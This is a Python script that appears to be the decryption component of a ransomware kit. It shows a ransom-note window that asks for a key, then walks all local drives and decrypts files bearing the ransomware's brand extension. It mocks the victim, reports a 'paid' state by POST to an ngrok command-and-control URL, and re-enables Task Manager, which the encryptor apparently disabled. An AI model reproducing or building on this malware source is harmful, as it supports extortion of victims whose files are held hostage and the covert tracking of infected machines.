from DecryptionView import DecryptionView, pop_up
from CryptoManager import CryptoManager
import os, sys

if __name__ == '__main__':
    cm = CryptoManager()
    
    if not cm.is_windows():
        print('Nothing to do here')
        sys.exit()

    ransom_note = DecryptionView()
    while True:
        try:
            event, values = ransom_note.note.read()
            key = values[0]

            if cm.correct_key(key):
                local_drives = cm.get_local_drives()

                for ld in local_drives:
                    for root, dirs, files in os.walk(ld):
                        [dirs.remove(d) for d in list(dirs) if d in cm.PROTECTED_DIRS]
                        for fn in files:
                            full_path = root + os.sep + fn
                            ext=cm.get_file_extension(full_path)
                            if ext == cm.BRAND_EXT:
                                print(full_path + ' -> [decrypted]')
                                cm.symmetric_encrypt_or_decrypt(full_path, opt='decrypt')

                break # salimos del bucle infinito
            else:
                pop_up(text="Wrong key")
                
        except Exception as e:
            pop_up(text="Wrong key")

    local_drives = cm.get_local_drives()
    cm.search_and_merge(local_drives)
    
    print('All data was successfully decrypted')
    pop_up(text="All data was decrypted successfully. Be careful on the internet next time ;)")

    # TODO insert id
    cm.send_post_request(url='http://6e5eca4e96f6.ngrok.io', mode='update', state='paid')
    cm.enable_task_manager()
